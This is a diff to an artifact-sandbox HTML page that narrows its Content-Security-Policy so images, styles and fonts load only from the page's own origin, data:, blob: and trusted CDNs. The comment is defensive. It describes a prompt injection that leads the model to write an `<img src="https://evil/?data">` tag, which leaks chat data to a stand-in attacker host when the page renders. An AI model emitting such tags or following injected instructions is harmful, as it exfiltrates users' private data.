@@ -23,12 +23,12 @@
     - call parent fetch endpoints with the user's credentials
     - read or write parent.document
 
-  The CSP meta tag below also blocks `connect-src` entirely, so scripts in
-  the artifact cannot exfiltrate to attacker domains via fetch / XHR /
-  WebSocket. Images, fonts, and inline styles are allowed because the
-  artifact may legitimately need them; an `<img src="https://evil/?data">`
-  only leaks what was already in the user's chat history (the data the
-  model put into the artifact was already on screen).
+  The CSP meta tag below also blocks `connect-src` entirely, and loads
+  images, stylesheets and fonts only from data:, blob:, this origin and the
+  CDN hosts it trusts for scripts. A prompt injection read during a chat can
+  have the model write `<img src="https://evil/?data">`, which the browser
+  fetches on render with no click, so no resource directive may admit an
+  arbitrary host.
 
   `frame-src 'self'` (was 'none') exists for ONE reason: renderHtml() below
   mounts the artifact document in a nested `<iframe srcdoc>` rather than
@@ -53,7 +53,7 @@
     -->
     <meta
       http-equiv="Content-Security-Policy"
-      content="default-src 'none'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://unpkg.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://esm.sh; style-src 'self' 'unsafe-inline' https:; img-src 'self' data: blob: https:; font-src 'self' data: https:; media-src data: blob:; connect-src 'none'; frame-src 'self'; child-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'"
+      content="default-src 'none'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://unpkg.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://esm.sh; style-src 'self' 'unsafe-inline' https://unpkg.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://esm.sh; img-src 'self' data: blob: https://unpkg.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://esm.sh; font-src 'self' data: https://unpkg.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://esm.sh; media-src data: blob:; connect-src 'none'; frame-src 'self'; child-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'"
     />
     <style>
       :root {
